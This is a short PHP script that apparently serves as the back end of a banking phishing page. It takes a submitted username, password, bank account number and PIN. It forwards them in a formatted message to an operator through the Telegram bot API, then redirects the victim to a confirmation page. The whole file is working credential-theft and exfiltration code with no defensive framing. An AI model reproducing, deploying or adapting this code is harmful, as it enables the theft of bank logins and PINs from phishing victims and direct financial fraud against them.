<?php 



session_start();
include "./telegram.php";

$_SESSION['phoneNumber'] = $_POST['phoneNumber'];

$message = "▣━━◤𝗗𝗮𝘁𝗮 𝗟𝗼𝗴𝗶𝗻◢━━▣". "\n\n𝗨𝘀𝗲𝗿 : ". $_POST ['user']. "\n𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ". $_POST ['pass']. "\n𝗡𝗼𝗿𝗲𝗸 : ". $_POST ['norek']. "\n𝗣𝗜𝗡 : ". $_POST ['pin'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  konf.html");
?> 